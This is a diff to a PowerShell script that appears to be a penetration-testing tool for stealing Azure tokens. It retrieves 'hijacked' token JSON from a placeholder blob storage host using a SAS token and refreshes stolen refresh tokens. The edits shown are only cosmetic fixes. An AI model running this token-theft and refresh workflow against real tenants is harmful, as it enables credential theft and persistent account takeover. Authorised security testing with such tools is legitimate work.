@@ -80,6 +80,8 @@ Invoke-StealAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.
         This function performs a GET request against the Actors Cloud Storage to visibly extract values from the JSON Metadata
     .NOTES
         WARNING: This Function should only be used in environments where you have explicit permission
+
+
 #>
 
 #Now let's make an API request to gather the hijacked JSON :)
@@ -104,7 +106,7 @@ function Get-StolenAzureTokens {
 
 }
 
-$HiJackedTokens = Get-StolenAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.net/test' -SasToken 'sv=2022-11..
+$HiJackedTokens = Get-StolenAzureTokens -ContainerUri 'https://pentestexample.blob.core.windows.net/test' -SasToken 'sv=2022-11..'
 
 <#
     .SYNOPSIS
@@ -115,7 +117,7 @@ $HiJackedTokens = Get-StolenAzureTokens -ContainerUri 'https://pentestexample.bl
         WARNING: This Function should only be used in environments where you have explicit permission
 #>
 
-#Now lets use the hijacked refresh token to get ANOTHER Access token before it expires.
+#Now let's use the hijacked refresh token to get ANOTHER Access token before it expires.
 function Update-StolenAzureTokens {
     [CmdletBinding()]
     param ()   
